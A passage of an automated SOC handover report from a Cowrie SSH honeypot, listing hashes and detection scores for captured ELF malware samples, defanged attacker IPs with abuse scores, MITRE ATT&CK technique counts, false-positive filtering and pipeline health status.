| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `45.66.156[.]214` | US | Enzu cloud and colocation services | **100** ⚠️ | 1 |
| `176.124.88[.]29` | KZ | Kar-Tel LLC | **100** ⚠️ | 44 |
| `218.27.80[.]178` | CN | China Unicom Jilin province network | **100** ⚠️ | 5 |
| `45.172.152[.]74` | DO | WIRELESS SOLUTIONS DOMINICANA WSD S.R.L. | **100** ⚠️ | 50 |
| `139.198.113[.]29` | HK | Yunify Technologies Inc. | **100** ⚠️ | 4 |
| `120.48.44[.]93` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `176.65.148[.]44` | NL | Pfcloud UG | **100** ⚠️ | 30 |
| `117.187.180[.]162` | CN | China Mobile Communications Corporation | **100** ⚠️ | 6 |
| `14.103.107[.]31` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `89.58.10[.]55` | DE | netcup GmbH | **100** ⚠️ | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 104 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 62 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 27 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 13 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 13 |

---

## 🔕 False Positive Summary (11 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 263 cases |
| Tool 34  | Credential Extractor        | ✅ 89 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 27 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 11 filtered (4.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 24 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 32 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 27 priority case(s) shown individually · 17 recon entry/entries in table (9 group(s) consolidating 217 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-04T16:57:02Z_
